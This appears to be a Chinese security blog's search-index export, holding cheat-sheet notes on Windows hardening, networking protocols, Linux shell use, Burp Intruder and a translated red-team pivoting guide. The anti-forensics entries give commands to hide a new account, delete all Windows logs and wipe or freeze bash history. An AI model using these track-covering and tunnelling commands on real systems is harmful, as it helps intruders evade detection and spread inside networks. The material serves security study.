    <content type="text"><![CDATA[基本配置下面这几项应为每一个使用Windows的用户的最最基本安全配置： 开启Windows防火墙 设置用户帐户控制(UAC)为合适级别 保持Windows更新 帐户安全此方面的加固主要是为了防止针对帐户的暴力破解，帐户是黑客入侵系统的突破口，帐户越多，危险系数越高。 停用Guest帐户：在计算机管理的本地用户和组中禁用Guest帐户，并为Guest帐户设置复杂密码，并拒绝远程访问。 重命名或禁用Administrator帐户：在计算机管理的本地用户和组中为Administrator帐户重命名，或直接禁用。 创建陷阱帐户：在计算机管理的本地用户和组中创建一个名为Administrator的本地帐户，并将它的权限设置成最低，加上一个超过10位的强密码。可通过将其隶属于Guest组已达到权限最低。 限制用户数量：在计算机管理的本地用户和组中删除所有的测试帐户、共享帐户和普通部门帐户，一般情况下，如果系统用户超过10个，一般总会存在一两个弱口令帐户。 开启帐户锁定策略：在本地安全策略的帐户锁定策略中设置帐户锁定阈值为3次，帐户锁定时间为30分钟，重置帐户锁定计数器为30分钟之后。 系统安全一个安全操作系统的基本原则是：最小的权限+最少的服务=最大的安全。 开启密码策略：在本地安全策略的密码策略中启用密码复杂性要求，设置密码长度最小值为7，密码最短使用期限为1，密码最长使用期限为42，强制密码历史为24，禁用以可还原的加密储存密码。 设置双重加密帐户保护：在运行对话框中输入syskey，启用SAM数据库加密工具，为Windows登录设置双重加密，注意此功能在Windows10中已被剔除。 取消默认共享：编辑注册表键HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\LanmanServer\Parameters，新建项AutoShareServer，值为0，即可关闭盘符默认共享，新建项AutoShareWks，值为0，即可关闭ADMIN默认共享。 开启审核策略：在本地安全策略的审核策略中审核所有的成功失败操作，记录的信息可以在事件查看器的Windows日志中查看。 修改TTL值：编辑注册表键HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Tcpip\Parameters，新建项defaultTTL，随便赋值，以防黑客通过ping获取TTL以鉴别操作系统类型。 关闭不必要的服务：Windows默认会启动多个服务，可以在计算机管理的服务中禁用相关服务，下面列出了一些可以禁用的服务： COM+ Event System Computer Browser Distributed Link Tracking Client Routing and Remote Access]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[802.11协议分析]]></title>
    <url>%2F2018%2F05%2F11%2F80211%2F</url>
    <content type="text"></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IPSec运行机制]]></title>
    <url>%2F2018%2F05%2F11%2Fipsec%2F</url>
    <content type="text"></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IP协议分析]]></title>
    <url>%2F2018%2F05%2F11%2Fip%2F</url>
    <content type="text"><![CDATA[IP(Internet Protocol，网际协议) 数据报格式]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[TCP协议分析]]></title>
    <url>%2F2018%2F05%2F11%2Ftcp%2F</url>
    <content type="text"><![CDATA[TCP(Transmission Control Protocol，传输控制协议) 报文段结构]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HTTPS运行机制]]></title>
    <url>%2F2018%2F05%2F11%2Fhttps%2F</url>
    <content type="text"></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HTTP协议分析]]></title>
    <url>%2F2018%2F05%2F11%2FHTTP%2F</url>
    <content type="text"><![CDATA[HTTP(Hypertext Transfer Protocol，超文本传输协议) 报文格式HTTP请求报文方法字段可以取几种不同的值，包括GET、POST、HEAD、PUT和DELETE。绝大部分的HTTP请求报文使用GET方法。Host首部行指明对象所在的主机，该信息是Web代理高速缓存所要求的；Connection首部行指明采用非持续连接还是持续连接；User-Agent首部行指明用户代理；Accept-Language首部行指明用户想得到的语言版本。使用GET方法时实体体(entity body)为空，而使用POST方法时才使用该实体体。HEAD方法类似于GET方法。当服务器收到使用HEAD方法的请求时，将会用一个HTTP报文进行响应，但是并不返回请求对象。应用程序开发者常用HEAD方法进行调试跟踪。PUT方法常与Web发行工具联合使用，它运行用户上传对象到指定的Web服务器上指定的路径(目录)。PUT方法也被那些需要向Web服务器上传对象的应用程序使用。DELETE方法允许用户或者应用程序删除Web服务器上的对象。 HTTP响应报文Date首部行指示服务器产生并发送该响应报文的日期和时间；Last-Modified首部行指示了对象创建或者最后修改的日期和时间；Server首部行指示服务器类型，类似于User-Agent首部行；Content-Length首部行指示了被发送对象中的字节数；Content-Type首部行指示了实体体中的对象的MIME类型。常见的状态码和其对应的短语：200 OK：请求成功，信息在返回的响应报文中。301 Moved Permanently：请求的对象已经被永久转移了，新的URL定义在响应报文的Location首部行中。客户软件将自动获取新的URL。400 Bad Request：一个通用差错代码，指示该请求不能被服务器理解。404 Not Found：被请求的文档不在服务器上。505 HTTP Version Not Supported：服务器不支持请求报文使用的HTTP协议版本。 Web缓存条件GET(conditional GET)方法：请求报文使用GET方法，并且请求报文中包含一个If-Modified-Since首部行。Web缓存器为了验证所缓存的对象是否是最新的，会使用条件GET方法向目标服务器发送一个请求报文，If-Modified-Since首部行的值为当初缓存对象时响应报文中Last-Modified首部行的值。如果所要验证的对象是最新的，即没有被修改过，则目标服务器会返回一个“304 Not Modified”响应报文，其中实体体为空。 注意 HTTP是一个无状态协议(stateless protocol)。 HTTP可以采用非持续连接或持续连接，默认采用持续连接。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[set、env与export]]></title>
    <url>%2F2018%2F05%2F09%2Fset-env-export%2F</url>
    <content type="text"><![CDATA[环境变量环境变量，顾名思义由环境和变量两部分组成，本质上就是一些变量，每个进程都有一个自己的运行环境，而在这些环境中又有一些定义的变量，Shell也是如此，同样的，通过Shell所运行的命令，相当于从父进程创建了一个子进程，它们共享同样的环境变量。环境变量可以大致分为Shell环境变量和用户环境变量两大类，不同的Shell有不同的Shell环境变量，例如bash与zsh的Shell环境变量就不相同，而用户环境变量通常是由用户自定义的，Shell环境变量包含了用户环境变量。在Shell中可以使用declare命令直接定义Shell环境变量，如：1declare A=hello #定义Shell环境变量a，值为hello，注意等号两边不能有空格 使用echo命令即可打印环境变量的值，如：1echo $A #打印HOME的值 值得注意的是，这种定义只对本Shell有效，关闭Shell后失效。 常见的用户环境变量有： PATH：用以指定命令的搜索目录 HOME：用以指定用户的家目录 SHELL：用以指定用户的登录Shell setset命令用来显示或设置Shell环境变量，当不带参数运行时默认显示所有已定义的Shell环境变量，若要设置环境变量可采用：12 值得注意的是，当declare命令不带任何参数运行时，也会显示所有的Shell环境变量，但它比set显示的结果要更加清晰。关于set命令更多的参数使用说明可参考Bash脚本set命令教程 envenv命令用来显示或设置用户环境变量，当不带参数运行时默认显示所有已定义的用户环境变量，若要设置环境变量可采用：12 exportexport命令用来显示或设置当前导出至用户环境变量的Shell环境变量，当不带参数运行时默认显示所有已导出至用户环境变量的Shell环境变量，若要导出某Shell环境变量到用户环境变量可采用：1export a=hello 这一步操作实际上完成了两步操作，即：12declare a=hello #定义一个Shell环境变量$aexport $a #导出至用户环境变量]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[source、sh与 ./]]></title>
    <url>%2F2018%2F05%2F09%2Fsource-sh%2F</url>
    <content type="text"><![CDATA[sourcesource a.sh在当前Shell中执行a.sh，a.sh不需要有执行权限。source也可以简写为.，比如. a.sh。 shsh a.sh打开一个子Shell去执行a.sh，a.sh不需要有执行权限。在子Shell里执行的a.sh里设置的变量，不会影响到父Shell。类似的，bash与sh同理。 ././a.sh打开一个子Shell去执行a.sh，a.sh需要有执行权限。注意，这里./与a.sh之间没有空格，换个角度看，其实没有使用任何命令，只是指定了当前文件夹下的这个文件而已。这就相当于双击这个文件去运行一样，那这个文件肯定要具有可执行权限。至于为什么要加./，我猜想是为了预防与环境变量中相同的名称引起冲突。前面采用了相对路径的方法，当然也可以采用绝对路径，比如/root/a.sh这样，同样可以执行。另外，./运行的文件里通常有Shebang一行，也就是以#!开头的第一行，用以指明执行这个脚本文件的解释程序。如果没有Shebang一行，那么以./a.sh运行脚本时，会自动使用环境变量中的$SHELL变量所指定的解释器来运行。最后，在以sh a.sh或bash a.sh这样的命令运行脚本时，即使文件中指明了Shebang，也会自动忽略，因为在命令中已经明确指定了所采用的解释器。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux的包管理机制]]></title>
    <url>%2F2018%2F05%2F09%2Flinux-package%2F</url>
    <content type="text"><![CDATA[Linux大致可以分为2个派别：一派以Red Hat为首，主要包括CentOS(社区版)、Fedora(桌面版)等；另一派以Debian为首，主要包括Ubuntu、Kali等。Red Hat系采用rpm为其包格式，yum为其包管理工具；Debian系采用dpkg为其包格式，apt-get为其包管理工具。 rpm与yumrpm全称Red-Hat Package Manager(RPM软件包管理器)，是Red Hat系中的包格式，同时也是其本地包管理工具，常用命令有：12rpm -i a.rpm #安装arpm -e a #卸载a yum全称Yellow dog Updater, Modified(修改后的黄色狗更新器)，是Red Hat系中的包管理工具，常用命令有：1234yum update #更新包列表yum upgrade #更新包yum install a #安装ayum remove a #卸载a dpkg与apt-getdpkg全称Debian Packager(Debian包工具)，是Debian系中的包格式，同时也是其本地包管理工具，常用命令有：12dpkg -i a.dpkg #安装adpkg -r a #卸载a apt-get是apt中的一个子程序，apt全称Advanced Packaging Tool(先进的包工具)，是Debian系中的包管理工具，常用命令有：1234apt-get update #更新包列表apt-get upgrade #更新包apt-get install a #安装aapt-get remove a #卸载a 同样的，apt-cache也是apt中的一个子程序，它的常用命令有：1apt-cache depends a #查看包a的依赖包 值得注意的是，随着新版系统的到来，出现了更为强大的apt命令，可以简单认为apt集合了apt-get、apt-cache、apt-config中的最常用命令选项。例如，apt install相比apt-get install增加了色彩显示以及进度条显示等功能。因此，更建议使用apt命令，常用命令有：1234apt update #更新包列表apt upgrade #更新包apt install a #安装aapt remove a #卸载a]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[手机号与身份证号的秘密]]></title>
    <url>%2F2018%2F05%2F09%2Fphone-number-and-id-card%2F</url>
    <content type="text"><![CDATA[手机号码国内手机号码为11位数，按照各部分编码的含义可以分为3段：前3位是网络识别号，用以标识一个通信运营商；第4-7位是地区编码，由HLR归属位置寄存器确定；第8-11位是用户号码，此段随机分配。 身份证号码国内居民身份证号码为18位数，按照各部分编码的含义可以分为4段：前6位是地址码，即编码对象常住户口所在县的行政区划代码，其中第1-2位表示省，第3-4位表示市，第5-6位表示县；第7-14位是出生日期码；第15-17位是顺序码，即在地址码所标识的区域范围内，对同年、月、日出生的人员编定的顺序号，其中第17位奇数分给男性，偶数分给女性；第18位是校验码，根据前面17位数字码，按照如下算法计算出来的：]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>社会工程学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MIME Type]]></title>
    <url>%2F2018%2F05%2F09%2FMIME-Type%2F</url>
    <content type="text"></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[后渗透测试阶段的信息收集]]></title>
    <url>%2F2018%2F05%2F09%2Finformation-gathering-of-post-exploitation%2F</url>
    <content type="text"><![CDATA[浏览器密码、历史，电脑密码，邮箱密码，QQ聊天记录，最近打开的文件，环境变量，持久后门我们假设客户端为Windows系统，服务器为Linux系统，下面分别针对客户端与服务器进行信息收集。 Windows登录密码Windows的登录密码保存在%windir%\System32\config\SAM中， Linux]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[针对哈希算法的攻击]]></title>
    <url>%2F2018%2F05%2F09%2Fhash-attack%2F</url>
    <content type="text"></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>密码学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[编码与加密]]></title>
    <url>%2F2018%2F05%2F08%2Fencode-encrypt%2F</url>
    <content type="text"><![CDATA[编码编码(encode)是信息从一种形式或格式转换为另一种形式的过程。相应的，解码(decode)是编码的逆过程。常见的编码算法有ASCII编码、URL编码、HTML编码、Base64编码等。 加密加密(encryption)是将明文信息改变为难以读取的密文内容，使之不可读。只有拥有解密方法的对象，经由解密(decryption)过程，才能将密文还原为正常可读的内容。现代密码学中的加密算法可以分为两类：对称加密(Symmetric encryption)和非对称加密(Asymmetric encryption)。对称加密就是将信息使用一个密钥进行加密，解密时使用同样的密钥，同样的算法进行解密。非对称加密，又称公开密钥加密，是加密和解密使用不同密钥的算法，一个是公开密钥，一个是私有密钥，一个用作加密的时候，另一个则用作解密，虽然两个密钥在数学上相关，但如果知道了其中一个，并不能凭此计算出另外一个。在通信中，加密通常使用的是对方的公钥，当对方收到密文后可以使用自己的私钥解密。如果加密使用的是自己的私钥，则密文可由任何人解密，由此可验证该文件必定出自该用户，这亦称作数字签名(Digital Signature)。常见的对称加密算法有DES、3DES、AES、RC5等。常见的非对称加密算法有RSA、Elgamal等。非对称加密在计算上相当复杂，速度远远比不上对称加密，因此，在一般实际情况下，往往通过非对称加密来随机创建临时的对称密钥，亦即对话键，然后才通过对称加密来传输大量、主体的数据。加密算法实质上是密码算法中的一种，另一种则是哈希(hash)算法。 哈希哈希算法，又称为散列算法，就是把任意长度的输入变换成固定长度的输出，是一种不可逆的算法，也就是说不能通过密文(即哈希值)反算出明文，这是一种单向加密的算法。另外，多个不同的明文可能会得到同一个密文，因为值域是有限的，这种情况称为冲突。一个优秀的哈希算法会尽量的减少这种冲突性。常见的哈希算法有MD5、SHA-1、SHA-256、CRC-32、CRC-64等。注意： 密码学建议，不要使用任何自己创造的私有加密算法，应该使用广泛使用的公开加密算法，这些都是已被证明安全的。 编码与加密主要的区别在于，所用的Key是否是公共所知的，或者说，编码根本就没有Key。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>密码学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[反取证之Windows]]></title>
    <url>%2F2018%2F05%2F02%2Fanti-forensics-windows%2F</url>
    <content type="text"><![CDATA[MACE时间和反取证之Linux中的一样，Windows也有MAC时间，不过在Windows中，C指的是Created，即创建时间，Windows中默认显示的是修改时间，另外，在Windows的NTFS文件系统中还有E时间，即MFT entry，其中包含了文件的大量信息，包括大小、名称、目录位置、磁盘位置、创建日期等，在擦除痕迹时也要擦除E时间，同样，meterpreter中的timestomp命令可以方便的修改MACE时间。 隐藏新建账号当在目标系统上新建了用户账号后，通常会在登录界面上显示出来，要实现隐藏，可以修改注册表项，采用如下命令：1REG ADD HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList /v uname /t REG_DWORD /d 0 注意：这种隐藏只是在登录界面的隐藏，用户使用net user或“本地用户和组”仍然可以查到新建的账户。 日志文件清除相关日志文件 系统日志Windows系统日志文件一般存放在Windows文件夹下，可以使用如下命令删除之：1del %windir%\*.log /a/s/q/f 另外，meterpreter中的clearev命令可以删除事件查看器中的日志信息。 Web日志IIS的日志文件位于%windir%\System32\LogFiles目录下。 最后，请不要忘记HIDS/IPS/WAF/集中的日志服务器的痕迹擦除。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Windows</tag>
        <tag>渗透</tag>
        <tag>计算机取证</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[反取证之Linux]]></title>
    <url>%2F2018%2F05%2F02%2Fanti-forensics-linux%2F</url>
    <content type="text"><![CDATA[后渗透测试阶段的重要工作便是擦除痕迹，也即反取证，文件系统访问都会留下痕迹，最好的避免计算机取证的方法就是不要碰文件系统，这也是meterpreter的先天优势，它完全基于内存，Linux中的反取证主要涉及MAC时间、日志文件、history： MAC时间MAC即Modified/Accessed/Changed，也就是修改/访问/更改时间，修改时间指对文件内容修改时的时间，访问时间指对文件内容访问时的时间(例如通过cat查看时)，更改时间指对文件属性、权限更改时的时间。使用ls -l默认查看的是修改时间，要查看其余2个时间，可以加参数ls -l --time=atime/ctime，另一个查看MAC时间的命令是stat。使用touch -d &quot;5 days ago&quot;或touch -t 1805021030可以修改MAC中的MA时间。meterpreter中的timestomp命令可以方便的修改MAC时间。 日志文件清除相关日志文件 系统日志Linux中的日志文件主要有/var/log/auth.log、/var/log/secure、/var/log/wtmp、/var/log/btmp、/var/log/lastlog、/var/log/faillog。Debian系的auth.log文件与RedHat系的secure文件都记录了系统的登录日志，last命令用于查看登录日志以及重启日志，文件位于/var/log/wtmp；lastb命令用于查看登录失败日志，文件位于/var/log/btmp；lastlog命令用于查看所有用户最近一次登录日志，文件位于/var/log/lastlog；faillog命令与lastlog命令一样，用于查看用户登录失败日志，文件位于/var/log/faillog，此命令仅限于Debian系。 Web日志Apache的日志文件位于/var/log/apache2；Nginx的日志文件位于/var/log/nginx。 historyLinux中，每次输入的命令都会记录在用户文件夹中的.bash_history文件中，默认记录1000条命令，使用history命令即可查看，清除记录的方法是使用history -c命令。另一种清除记录的方法是更改.bash_history文件的属性，使用命令：chattr +i .bash_history使其不可被更改，从而无法向其写入任何数据。 最后，请不要忘记HIDS/IPS/WAF/集中的日志服务器的痕迹擦除。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>渗透</tag>
        <tag>计算机取证</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[形而上与形而下]]></title>
    <url>%2F2018%2F05%2F01%2Fmetaphysics-physics%2F</url>
    <content type="text"><![CDATA[形而上者谓之道，形而下者谓之器。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Sniper、Battering ram、Pitchfork、Cluster bomb的区别]]></title>
    <url>%2F2018%2F05%2F01%2Fburpsuite-intruder-attack-type%2F</url>
    <content type="text"><![CDATA[Burp Suite中的Intruder模块里有4种攻击模式，分别为Sniper、Battering ram、Pitchfork、Cluster bomb，在这里假设Payload set1=[1, 2]，Payload set2=[a, b, c, d]： SniperSniper，中文“狙击手”，每次只针对1个Payload Position，使用1个Payload set，示例如下： Request Position1(default:x) Position2(default:y) #1 1 y #2 2 y #3 x 1 #4 x 2 Battering ramBattering ram，中文“攻城槌”，每次针对多个Payload Position，使用1个Payload set，示例如下： Request Position1 Position2 #1 1 1 #2 2 2 PitchforkPitchfork，中文“杈子”，每次针对多个Payload Position，使用多个Payload set，最多支持5个列表，也即5个位置，采用平行模式，请求次数以最小列表项为准，示例如下： Request Position1 Position2 #1 1 a #2 2 b Cluster bombCluster bomb，中文“集束炸弹”，每次针对多个Payload Position，使用多个Payload set，最多支持5个列表，也即5个位置，采用交叉模式，请求次数为各列表项之积，示例如下： Request Position1 Position2 #1 1 a #2 1 b #3 1 c #4 1 d #5 2 a #6 2 b #7 2 c #8 2 d]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[URI与URL的区别]]></title>
    <url>%2F2018%2F04%2F29%2Furl-uri%2F</url>
    <content type="text"><![CDATA[URI，全称”Uniform Resource Identifier”，中文“统一资源标志符”，是一个用于标识某一互联网资源名称的字符串。URI的最常见的形式是统一资源定位符（URL），经常指定为非正式的网址。更罕见的用法是统一资源名称（URN），其目的是通过提供一种途径，用于在特定的名字空间资源的标识，以补充网址。 URL，全称”Uniform Resource Locator”，中文“统一资源定位符”，URL是URI的子集。示例如下：https://howiezhao.github.io/2018/04/29/url-uri/上面这个URL唯一标识了互联网中一台服务器上的一篇文章。 URN，全称”Uniform Resource Name”，中文“统一资源名称”，是另一种形式的URI，它通过特定命名空间中的唯一名称来标识资源。示例如下：urn:isbn:9780141036144上面这个URN唯一标识了乔治·奥威尔所著的《1984》。 简单说，URL代表一个人的位置，URN代表一个人的身份证号，通过URL和URN都可以唯一的找到这个人，所以它们都属于URI。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透中PoC、Exp、Payload与Shellcode的区别]]></title>
    <url>%2F2018%2F04%2F29%2Fpayload-shellcode-exp-poc%2F</url>
    <content type="text"><![CDATA[PoC，全称”Proof of Concept”，中文“概念验证”，常指一段漏洞证明的代码。Exp，全称”Exploit”，中文“利用”，指利用系统漏洞进行攻击的动作。Payload，中文“有效载荷”，指成功exploit之后，真正在目标系统执行的代码或指令。Shellcode，简单翻译“shell代码”，是Payload的一种，由于其建立正向/反向shell而得名。 几点注意：PoC是用来证明漏洞存在的，Exp是用来利用漏洞的，两者通常不是一类，或者说，PoC通常是无害的，Exp通常是有害的，有了PoC，才有Exp。Payload有很多种，它可以是Shellcode，也可以直接是一段系统命令。同一个Payload可以用于多个漏洞，但每个漏洞都有其自己的Exp，也就是说不存在通用的Exp。Shellcode也有很多种，包括正向的，反向的，甚至meterpreter。Shellcode与Shellshcok不是一个，Shellshock特指14年发现的Shellshock漏洞。 另外：在Metasploit Framework 6大模块中有一个Payload模块，在该模块下有Single、Stager、Stages这三种类型，Single是一个all-in-one的Payload，不依赖其他的文件，所以它的体积会比较大，Stager主要用于当目标计算机的内存有限时，可以先传输一个较小的Stager用于建立连接，Stages指利用Stager建立的连接下载后续的Payload。Stager和Stages都有多种类型，适用于不同场景。 尾巴：想象自己是一个特工，你的目标是监控一个重要的人，有一天你怀疑目标家里的窗子可能没有关，于是你上前推了推，结果推开了，这是一个PoC，于是你回去了，开始准备第二天的渗透计划，第二天你通过同样的漏洞渗透进了它家，仔细查看了所有的重要文件，离开时还安装了一个隐蔽的窃听器，这一天你所做的就是一个Exp，你在他家所做的就是不同的Payload，就把窃听器当作Shellcode吧！]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux中/etc/passwd与/etc/shadow的区别]]></title>
    <url>%2F2018%2F04%2F29%2Fpasswd-and-shadow%2F</url>
    <content type="text"><![CDATA[简单来说，/etc/passwd存储一般的用户信息，任何人都可以访问；/etc/shadow存储用户的密码信息，只有 root 用户可以访问。下面来详细介绍： /etc/passwd早期的Linux中，用户的密码也存储在此文件中，但因为此文件所有人都可以访问，对密码的存储不安全，但又不能把它的权限改为仅 root 用户，因为系统的其他程序可能会用到此文件中存储的用户其他信息，所以，后来Linux将用户密码存储到了/etc/shadow文件中，并将其权限设为仅 root 用户。在渗透过程中，这两个文件最好都检查。/etc/passwd的文件格式为：用户名:密码:用户ID:用户组ID:注释:用户目录:登录shell，共7项，默认情况下，root的用户ID为0，新建的其他用户ID从1000起，如果密码被存储在了/etc/shadow文件中，则此文件中密码项为x，常见形式如下：1root:x:0:0:root:/root:/bin/bash /etc/shadow/etc/shadow的文件格式为：用户名:密码:上次修改密码日期(从1970年1月1日起的天数):密码在两次修改期间的最小天数(0表示可在任何时间修改):密码需要被变更的天数(99999表示不需要变更):密码变更前提前几天警告:账号失效日期:账号失效后被禁用的天数:保留字段，共9项，如果密码项以 ! 或 * 起始，则代表此账号被锁定，不能用于登录，密码项中更为详细的格式为：\$加密方法ID\$Salt\$加密值，常见形式如下：1root:$6$Fsf6Q6SH$MlagWih0lcGFxtAo7/s8Z5.wywJyCqH6qateZ6yPFOPm8bNYTGAEPygZxSOPR1A9Rtw.WxJp2fNMOoeB1wj890:17524:0:99999:7:::]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Kali Rolling 2017中无法登录BeEF的解决方案]]></title>
    <url>%2F2018%2F02%2F08%2Fkali-beef-bug%2F</url>
    <content type="text"><![CDATA[在Kali Rolling 2017中打开BeEF然后自动跳转到登录页面，会发现只有BeEF的图标而没有登录框，无法进行登录，经查是因为和Metasploit的集成有关的，解决方案如下：将/usr/share/beef-xss/extensions/admin_ui/api/handler.rb文件中第22行的1minified = Uglifier.compile(evaluated) 改为1minified = evaluated 保存并重启BeEF即可。]]></content>
      <categories>
        <category>Bug</category>
      </categories>
      <tags>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Udacity CS373:无人驾驶汽车编程学习笔记一]]></title>
    <url>%2F2017%2F12%2F14%2Fcs373-1%2F</url>
    <content type="text"><![CDATA[一：定位蒙特卡罗定位是感知和运动的循环，每次感知都会获得信息，每次运动都会丢失信息，感知函数利用了贝叶斯规则，运动函数利用了全概率定理。基于一维的蒙特卡罗定位程序如下：1234567891011121314151617181920212223242526272829303132p = [0, 1, 0, 0, 0)world = ['green', 'red', 'red', 'green', 'green']measurements = ['red', 'green']motions = [1, 1]pHit = 0.6pMiss = 0.2pExact = 0.8pOvershoot = 0.1pUndershoot = 0.1def sense(p, Z): q = [] for i in range(len(p)): hit = (Z == world[i]) q.append(p[i] * (hit * pHit + (1-hit) * pMiss)) s = sum(q) for i in range (len(p)): q[i] = q[i]/s return qdef move(p, U): q= [] for i in range(len(p)): s = pExact * p[(i-U) % len(p)] s = s + pOvershoot * p[(i-U-1) % len(p)] s = s + pUndershoot * p[(i-U+1) % len(p)] q.append(s) return qfor k in range(len(measurements)): p = sense(p, measurements[k]) p = move(p, motions[k]) print p]]></content>
      <categories>
        <category>Notes</category>
      </categories>
      <tags>
        <tag>CS373</tag>
        <tag>无人驾驶</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一个Red Team成员的跳板(pivoting)指南]]></title>
    <url>%2F2017%2F12%2F10%2Fpivoting-guide%2F</url>
    <content type="text"><![CDATA[本文翻译自https://artkond.com/2017/03/23/pivoting-guide/ ，正文如下： 渗透测试人员经常通过逻辑网络边界来访问客户的关键基础设施。常见的情况包括在成功的外围攻破之后，将攻击发展到内部网络，或者在危及组织内的主机之后访问初始的不可路由的网段。跳板是red team/pentest参与过程中使用的一系列技术，它们利用攻击者控制的主机作为逻辑网络进行跳跃，旨在扩大网络可视性。在这篇文章中，我将介绍常用的跳板技术和可用的工具。 以公有IP为目标一个普遍的情况。比方说，你可以从互联网上找到一个网络应用程序中的RCE漏洞。你上传了一个shell，并想把你的攻击发展到内部网络。请注意，在这种特定情况下，你应该能够绑定受感染主机上的端口，并且应该可以从外部网络访问这些端口。 SSH端口转发设法找到在主机上运行的SSH服务的凭据？很好！连接到主机，如下所示：1ssh username@host -D 1080 这将在攻击者一侧产生一个socks服务器（ssh客户端）。欢迎来到内部网络;）也可以将一个特定的端口转发给特定的主机。假设你需要访问主机192.168.1.1的内部网络中的SMB共享。1ssh username@host -L 445:192.168.1.1:445 这样，端口445就会被打开在攻击者一侧。请注意，要绑定特权端口（例如445），你将需要在你的计算机上拥有root权限。 通过SSH的VPN由于openssh 4.3版本，可以通过已建立的ssh通道来传输第3层网络流量。这比典型的tcp隧道有优势，因为你在控制ip流量。因此，例如，你可以使用nmap执行SYN扫描，并直接使用你的工具，而无需使用proxychains或其他代理工具。它是通过在客户端和服务器端创建tun设备并通过ssh连接在它们之间传输数据完成的。这很简单，但是由于tun设备的创建是一个特权操作，所以在两台机器上都需要root。这些行应该出现在/etc/ssh/sshd_config文件（服务器端）中：12PermitRootLogin yesPermitTunnel yes 客户端上的以下命令将在客户端和服务器上创建一对tun设备：1ssh username@server -w any:any 标志-w接受用冒号分隔的每一侧的tun设备的数量。可以显式设置 —— -w 0:0，也可以使用-w any:any语法来获取下一个可用的tun设备。tun设备之间的隧道已启用，但接口尚未配置。配置客户端的示例：1ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 服务器端：1ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 在服务器上启用IP转发和NAT：12echo 1 &gt; /proc/sys/net/ipv4/ip_forwardiptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE 现在，你可以将对等主机1.1.1.1设置为你的默认网关，或通过它路由到特定的主机/网络：1route add -net 10.0.0.0/16 gw 1.1.1.1 在这个例子中，服务器的外部网络接口是eth0，两端新创建的tun设备是tun0。 3proxy在这里获取 - https://github.com/z3APA3A/3proxy/releases 。这个工具适用于多个平台。有预编译的Windows二进制文件。至于Linux，你将需要自己编译它，这是一个很简单的事，只是./configure &amp;&amp; make :)这个工具是代理世界中的瑞士军刀，所以它有很多的功能。我通常使用它作为socks代理或端口转发。这个工具从配置文件中获得所有选项。运行它：13proxy.exe config_file 或者如果你在Linux系统上：1./3proxy config_file 要在端口1080上运行3proxy作为socks5代理，请在config中放置以下行：1socks -p1080 现在可以通过这个代理来隧道化你的渗透测试工具，以发展内部网络的攻击。这只是一个不太安全的基本设置。你可以使用选项来放置身份验证和/或基于IP的访问控制规则。去检查完整的手册在这里 - https://3proxy.ru/howtoe.asp 。要对特定端口进行隧道使用，请用以下语法：1tcppm &lt;localport&gt; &lt;targethost&gt; &lt;targetport&gt; 